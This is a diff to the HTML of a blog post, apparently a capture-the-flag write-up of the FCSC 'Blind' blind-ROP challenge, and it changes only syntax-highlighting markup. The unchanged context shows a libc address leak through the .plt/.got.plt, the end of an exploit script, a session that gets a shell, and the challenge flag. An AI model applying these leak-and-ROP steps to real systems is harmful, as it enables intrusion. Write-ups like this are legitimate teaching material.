@@ -269,7 +269,7 @@ Let&rsquo;s try the easy way first : for that, with our arbitrary read, we will 
 00000540: ff25 a20a 2000 6804 0000 00e9 a0ff ffff  .%.. .h.........
 00000550: ff25 9a0a 2000 6805 0000 00e9 90ff ffff  .%.. .h.........
 </code></pre><p>What is this ? This is the <code>.plt</code> section : if we disassemble the 16 bytes at <code>0x400500</code> for instance, we get this :</p>
-<pre><code class="language-raw" data-lang="raw">ff25c20a2000       jmp    QWORD PTR [rip+0x200ac2]
+<pre><code class="language-x86asm" data-lang="x86asm">ff25c20a2000       jmp    QWORD PTR [rip+0x200ac2]
 6800000000         push   0x0
 e9e0ffffff         jmp    0xfffffffffffffff0
 </code></pre><p>It indicates where the <code>.got.plt</code> section is. With this, we can leak the address in the libc of the puts function (there is one entry just before in the <code>.plt</code> - and puts is the second entry according to data at 0x380).
@@ -331,8 +331,8 @@ p.send(payload)
 p.interactive()
 
 </code></pre></div><p>With this, we get a shell !</p>
-<pre><code class="language-raw" data-lang="raw">$ python3 exploit.py
-[*] '/root/FCSC/pwn/Blind/libc.so.6'
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 exploit.py
+[*] <span style="color:#a31515">&#39;/root/FCSC/pwn/Blind/libc.so.6&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    Canary found
@@ -341,7 +341,7 @@ p.interactive()
 [*] Switching to interactive mode
 $ id
 uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
-</code></pre><p>And the flag : <code>FCSC{3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50b989dc010f28}</code></p>
+</code></pre></div><p>And the flag : <code>FCSC{3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50b989dc010f28}</code></p>
 <h2 id="conclusion">Conclusion</h2>
 <p>This was a fun challenge, a classic blind rop with a little twist of ASLR + no fork, making it very enjoyable :)
 The challenge could have been made harder by using a hard to find libc, in which case the <code>DynELF</code> python library would have come in handy, but I chose the manual approch for this challenge.</p>
@@ -381,7 +381,11 @@ The challenge could have been made harder by using a hard to find libc, in which
         
             <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/languages/c.min.js" defer></script>
         
-            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/languages/asm.min.js" defer></script>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/languages/x86asm.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/languages/armasm.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/languages/bash.min.js" defer></script>
         
         <script>
             window.addEventListener('load', function() {
